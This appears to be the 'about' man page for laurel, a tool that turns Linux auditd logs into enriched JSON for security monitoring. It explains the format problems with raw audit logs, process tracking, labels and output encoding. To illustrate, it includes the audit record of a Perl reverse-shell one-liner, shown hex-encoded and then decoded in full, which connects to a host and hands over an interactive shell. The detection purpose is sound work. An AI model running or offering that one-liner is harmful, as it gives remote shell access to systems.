---
title: laurel - About
section: 7
header: System Administration Utilities
footer: laurel 0.5.1
---

# NAME
laurel-about - High-level description of `laurel(8)` design, rationale, features

# DESCRIPTION

## Problem statement

While logs produced by the Linux Audit subsystem and _auditd(8)_ contain information that can be very useful for host-based security monitoring, the log format is not well-suited for at-scale analysis in a SIEM. 

### Format issues

- All non-trivial events are split across multiple lines that have to be joined together using a message identifier, but current search-centric log analysis systems are quite limited when it comes to join operations.
- Files and program executions are logged via `PATH` and `EXECVE` elements. The character set for strings is a limited subset of ASCII no escaping mechanism exists: If a string contains bytes that have special meaning in the format (even space or quote characters), the entire string is hex-encoded.
- Argument lists are preserved in `EXECVE` records, but with an `a0="…"`, `a1="…"`, `a2="…"`, `a3="…"` naming scheme, they are not easily accessible.
- Long command lines may be spread across multiple `EXECVE` event lines.
- For numeric values, there is no clear distinction whether they should be interpreted as decimal, octal, or hexadecimal values.

### Missing context

Most audit events are based on either system calls or file operations. Whether or not some suspicious actions should be considered harmful, largely depends on the context in which it takes place. For example, one would not expect most web applications to use `netcat` to connect to hosts on the Internet, but an administrator who is logged and over SSH who uses `netcat` to debug network issues should raise fewer suspicions. Unfortunately, the only context that can be added for Linux audit events "keys" using the `-k` parameter of `auditctl(8)`.

### Example

Spawning a simple Perl reverse-shell one-liner creates the following 7-line audit log entry that nicely demonstrates some of these  shortcomings:
```
type=SYSCALL msg=audit(1626611363.720:348501): arch=c000003e syscall=59 success=yes exit=0 a0=55c094deb5c0 a1=55c094dea770 a2=55c094dbf1b0 a3=fffffffffffff286 items=3 ppid=722076 pid=724395 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts3 ses=3 comm="perl" exe="/usr/bin/perl" subj==unconfined key=(null)ARCH=x86_64 SYSCALL=execve AUID="user" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B657428532C50465F494E45542C534F434B5F53545245414D2C67657470726F746F62796E616D6528227463702229293B696628636F6E6E65637428532C736F636B616464725F696E2824702C696E65745F61746F6E282469292929297B6F70656E28535444494E2C223E265322293B6F70656E285354444F55542C223E265322293B6F70656E285354444552522C223E265322293B6578656328222F62696E2F7368202D6922293B7D3B
type=CWD msg=audit(1626611363.720:348501): cwd="/root"
type=PATH msg=audit(1626611363.720:348501): item=0 name="/usr/bin/perl" inode=401923 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1626611363.720:348501): item=1 name="/usr/bin/perl" inode=401923 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1626611363.720:348501): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=404797 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1626611363.720:348501): proctitle=7065726C002D650075736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B657428532C50465F494E45542C534F434B5F53545245414D2C67657470726F746F62796E616D6528227463702229293B696628636F6E6E65637428532C736F636B616464725F696E2824702C696E65745F6174
```

## Solution

In addition to (or instead of) writing log files, `auditd(8)` can pass log lines to one or multiple plug-ins for further processing, see `auditd-plugins(5)`. `laurel(8)` is intended to be run as such a plug-in. It reads the audit logs from standard input, parses them, and writes a modified form of the audit log to a different log file.

### Output format

Log records carrying the same event ID (the `msg=audit(TIME:SEQUENCE):` part) are collected into coherent events and output as a JSONlines-based log format. Most importantly, hex-encoded strings are output as regular JSON strings. [RfC8259] mandates that "text exchanged between systems that are not part of a closed ecosystem MUST be encoded using UTF-8", therefore any bytes or byte sequences that are not valid UTF-8 are percent-encoded as described in [RfC3986]. Numbers are parsed as decimal, octal, or hexadecimal values and output in an unambiguous format. List data (`SYSCALL.{a0 … a3}` and `EXECVE.a*`) are turned into JSON arrays. `PROCTITLE.proctitle` is split at NULL bytes and transformed into a list.

[RfC8259]: https://datatracker.ietf.org/doc/html/rfc8259 'The JavaScript Object Notation (JSON) Data Interchange Format'

[RfC3986]: https://datatracker.ietf.org/doc/html/rfc3986 'Uniform Resource Identifier (URI): Generic Syntax'

### Structure

Every audit log line produced by _LAUREL_ is one single JSON object consisting of key/value pairs that contains at least an `ID` field.

- `SYSCALL`, `EXECVE`, `CWD`, `PROCTITLE` fields point to single JSON objects.
- `PATH`, `SOCKADDR` fields point to lists of JSON objects.

Every other kernel-produced audit message not mentioned above results in field pointing to a list of JSON objects. Details may change after the list of kernel audit message types has been reviewed.

### Encoding of invalid UTF-8 strings and binary data

- Most byte values that represent printable ASCII characters are reproduced as-is (but are subject to JSON string escaping rules).
- Bytes that map to non-printable ASCII characters (less than 32/0x20; 127/0x7f) are percent-encoded.
- Byte values that map to `%` (37/0x25) and `+` (42/0x2b) are percent-encoded.
- Byte values outside of the ASCII range (greater than 127/0x7f) are reproduced as-is if they are part of a valid UTF-8 sequence. Otherwise, they are percent-encoded.

Handling of special Unicode characters may change in the future.

### Translation / Enrichment

If `auditd(8)` has been configured with `log_format=ENRICHED`, it translates some numeric values in the original audit data to strings. Per convention, it adds translated information using all-caps versions of the keys. For example, 

    arch=c000003e syscall=59 uid=0
	
get translated to

    ARCH=x86_64 SYSCALL=execve UID="root"

by `auditd(8)`. All information that is added to records by `laurel(8)`  follows the same convention, i.e. keys are turned into all-caps. While `laurel` can be configured to perform the same translations as `auditd(8)`, it con perform other enrichments, including interpreted scripts, collecting specific environment variables, or container information for processes that are run within container environments.

### Adding Context: Process Relationships, Labels

While processing audit records `laurel(8)` tracks processes and remembers `comm`, `exe`, and the event ID associated with the latest `execve` event of a process. Processes that are tracked can be assigned labels through various mechanisms and those labels can optionally be propagated to child processes.

Mechanisms by which labels can be assigned include:
- using the key from an audit event (the `-k` option of `auditctl(8)`)
- regular expression applied to the executable path (`SYSCALL.exe` field)
- regular expression applied to the script path (`SYSCALL.SCRIPT` field, enriched)

The process tracking information can be used to enrich fields containing process ids, including `SYSCALL.{pid, ppid}` and `OBJ_PID.opid` associated with `ptrace` attach or `kill` syscalls.

### Volume reduction: Filtering out events

To reduce the high volume of events, it is possible to filter out events by key or by process label. Events that are filtered are still used for process tracking.

### Example

The log lines from the Perl reverse shell execution above are processed by `laurel(8)` into the following JSON log line:
``` json
{"ID":"1626611363.720:348501","SYSCALL":{"arch":"0xc000003e","syscall":59,"success":"yes","exit":0,"a0":"0x55c094deb5c0","a1":"0x55c094dea770","a2":"0x55c094dbf1b0","a3":"0xfffffffffffff286","items":3,"ppid":722076,"pid":724395,"auid":1000,"uid":0,"gid":0,"euid":0,"suid":0,"fsuid":0,"egid":0,"sgid":0,"fsgid":0,"tty":"pts3","ses":3,"comm":"perl","exe":"/usr/bin/perl","subj":"=unconfined","key":null,"ARCH":"x86_64","SYSCALL":"execve","AUID":"user","UID":"root","GID":"root","EUID":"root","SUID":"root","FSUID":"root","EGID":"root","SGID":"root","FSGID":"root","PPID":{"EVENT_ID":"1626611323.973:348120","exe":"/bin/bash","comm":"bash","ppid":3190631}},"EXECVE":{"argc":3,"ARGV":["perl","-e","use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]},"CWD":{"cwd":"/root"},"PATH":[{"item":0,"name":"/usr/bin/perl","inode":401923,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"},{"item":1,"name":"/usr/bin/perl","inode":401923,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"},{"item":2,"name":"/lib64/ld-linux-x86-64.so.2","inode":404797,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"}],"PROCTITLE":{"ARGV":["perl","-e","use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_at"]}}
```

# SEE ALSO
`laurel(8)`, `auditd(8)`, `audit.rules(7)`

# AUTHORS
- Hilko Bengen <<bengen@hilluzination.de>>
- Sergej Schmidt <<sergej@msgpeek.net>>
